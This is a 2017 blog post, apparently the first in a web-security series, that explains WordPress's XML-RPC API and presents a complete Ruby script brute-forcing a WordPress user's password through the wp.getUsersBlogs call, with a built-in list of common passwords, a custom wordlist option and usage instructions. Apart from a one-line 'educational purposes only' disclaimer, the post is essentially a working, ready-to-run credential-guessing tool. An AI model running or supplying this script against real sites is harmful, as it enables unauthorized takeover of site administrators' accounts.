---
layout: post
title: "Brute forcing wordpress password via XMLRPC API"
date: 2017-05-14 17:12
comments: true
categories: [wordpress hacking, web security]
description: wordpress password bruteforce, wordpress xmlrpc api, wordpress hacking
keywords: wordpress hacking, wordpress bruteforce, wordpress xmlrpc api, web hacking, wordpress information gathering
sharing: true
---
<img src="{{ root_url }}/images/wordpress-hacking.png"/> 

#### All code and information for educational purposes only

Starting a series of posts about web security, which also a passion of mine besides development.

The first post will be about bruteforce attack on wordpress using [XMLRPC API](https://codex.wordpress.org/XML-RPC_WordPress_API/Users). Second choice will be a direct bruteforce attack via 'wp-login.php' which may be more complex during
'Account Lockout Policy' and other things, maybe I will describe it in other post.

<!-- more -->

#### Whats is XML-RPC?
[The XML-RPC is an API that enables developers create WordPress ‘apps’ (like clients, plugins and themes), that allow you to make remote HTTP requests to your WordPress site.](https://blogvault.net/how-xml-rpc-affects-wordpress-security/)

The simplest way to check if XMLRPC API enabled(default) for you wordpress engine is going to browser and putting http://127.0.0.1:8080/xmlrpc.php, seeing 'XML-RPC server accepts POST requests only.' means XMLRPC API enabled.

A couple of words about other great tools for wordpress password bruteforce:

[WPScan](https://wpscan.org/), great tool for wordpress information gathering and for password brute-force attack
[Nmap with http-wordpress-brute script](https://nmap.org/nsedoc/scripts/http-wordpress-brute.html), performs brute force password auditing against Wordpress CMS/blog installations.

Let's start to build simple script which will iterate throught our dictionary and will find admin password for your wordpress, I am using [default dictionary](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Sucuri_Top_Wordpress_Passwords.txt) for out bruteforce attack.

Our script will use [xml-rpc client for ruby](https://ruby-doc.org/stdlib-2.3.1/libdoc/xmlrpc/rdoc/XMLRPC/Client.html)


#### wp_find_password.rb script
``` ruby 
#!/usr/bin/env ruby
# encoding: UTF-8

require 'optparse'
require 'xmlrpc/client'
require 'uri'


def wp_find_password(options)
  # https://github.com/danielmiessler/SecLists/blob/master/Passwords/Sucuri_Top_Wordpress_Passwords.txt
  passwords = %w(admin 123456 password 12345678 typhoon 666666 111111 1234567 qwerty
                 siteadmin qwerty siteadmin administrator root 123123 123321
                 1234567890 letmein123 test123 demo123 pass123 123qwe qwe123 654321 loveyou adminadmin123)

  uri = URI(options[:url])
  server = XMLRPC::Client.new(uri.host, uri.path, uri.port)
  server.http_header_extra = {'accept-encoding' => 'identity'}
  
  if options[:wordlist] != 'default'
    passwords = File.readlines(options[:wordlist])
    passwords.collect! {|s| s.chomp}
  end
  
  passwords.each do |password|
    begin
      response = server.call("wp.getUsersBlogs", options[:username], password)
      if response
        puts "--- Success: PASSWORD: #{password} for username: #{options[:username]} ---\n"
        break;
      end
    rescue XMLRPC::FaultException => e
      puts "Wrong password: #{password} for username: #{options[:username]}, response code #{e.faultCode}\n"
    end
  end
end

options = {:url => 'http://127.0.0.1:8080/wordpress/xmlrpc.php', :username => 'admin', :wordlist => 'default'}

OptionParser.new do |opts|
  opts.banner = "Usage: wp_find_password.rb [options]"
  opts.on('--username username', 'Username, default: admin') do |username|
    options[:username] = username
  end

  opts.on('--url url', 'Url, default: http://127.0.0.1/wordpress/xmlrpc.php') do |url|
    options[:url] = url
  end

  opts.on('--wordlist wordlist', 'Word List, default: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Sucuri_Top_Wordpress_Passwords.txt') do |wordlist|
    options[:wordlist] = wordlist
  end

  opts.on('-h', '--help', 'Displays Help') do
    puts opts
    exit
  end
end.parse!

wp_find_password(options)
``` 

You may download this script [here](https://github.com/warolv/wordpress-scripts)

Usage example: wp_find_password.rb --url 127.0.0.1:8080/wordpress/xmlrpc.php  --wordlist /Users/example/Downloads/wordlist.txt --username admin

Options:
Usage: wp_find_password.rb [options]
        --username username          Username, default: admin
        --url url                    Url, default: http://127.0.0.1/wordpress/xmlrpc.php
        --wordlist wordlist          Dictionary
    -h, --help                       Displays Help